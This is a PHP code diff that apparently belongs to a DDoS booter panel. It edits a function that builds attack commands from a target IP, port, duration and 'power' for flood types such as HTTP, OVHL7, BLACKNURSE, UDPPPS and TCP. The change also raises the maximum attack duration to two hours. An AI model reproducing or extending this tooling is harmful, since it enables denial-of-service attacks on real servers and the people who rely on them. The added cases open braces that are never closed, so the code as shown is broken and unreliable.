@@ -46,19 +46,21 @@ if (isset($_POST["submit"])) {
 
 function buildCommand($seltask, $postData) {
 
-  if($postData["time"] > 3600)
-    $postData["time"] = 3600;
+  if($postData["time"] > 7200)
+    $postData["time"] = 7200;
 
   $commonData = $postData["ip"] . "|" . $postData["port"] . "|" . $postData["time"];
 
   switch ($seltask) {
-    case "HTTP":
-    case "HTTPS":
-      if (isset($postData["path"]) && !empty($postData["path"]) && isset($postData["method"]) && !empty($postData["method"]))
-          return $commonData . "|" . $postData["path"] . "|" . $postData["method"] . "|" . $postData["power"];
-      break;
-    case "OVHL7":
-    case "PPS":
+	case "HTTP":
+	  if (isset($_POST["path"]) && !empty($_POST["path"]) && isset($_POST["method"]) && !empty($_POST["method"]) && isset($_POST["power"]) && !empty($_POST["power"])) {
+		  return $commonData . "|" . $_POST["path"] . "|" . $_POST["method"] . "|" . $_POST["power"];
+	  break;
+	case "OVHL7":
+	  if (isset($_POST["power"]) && !empty($_POST["power"])) {
+		  return $commonData . "|" . $_POST["power"];
+	  break;
+    case "HTTPSOCKET":
       if (isset($postData["power"]) && !empty($postData["power"]))
           return $commonData . "|" . $postData["power"];
       break;
@@ -69,8 +71,8 @@ function buildCommand($seltask, $postData) {
     case "BLACKNURSE":
       return $postData["ip"] . "|" . $postData["time"];
     case "UDPPPS":
-      if (/*isset($postData["threads"]) && !empty($postData["threads"]) && */isset($postData["ppspacketsize"]) && !empty($postData["ppspacketsize"]))
-        return $commonData . "|" /*. $postData["threads"] . "|" */ . $postData["ppspacketsize"];
+      if (isset($postData["ppspacketsize"]) && !empty($postData["ppspacketsize"]))
+        return $commonData . "|". $postData["ppspacketsize"];
       break;
     case "TCP":
       if (isset($postData["packetsize"]) && !empty($postData["packetsize"]) &&  isset($postData["checkboxes"])) {
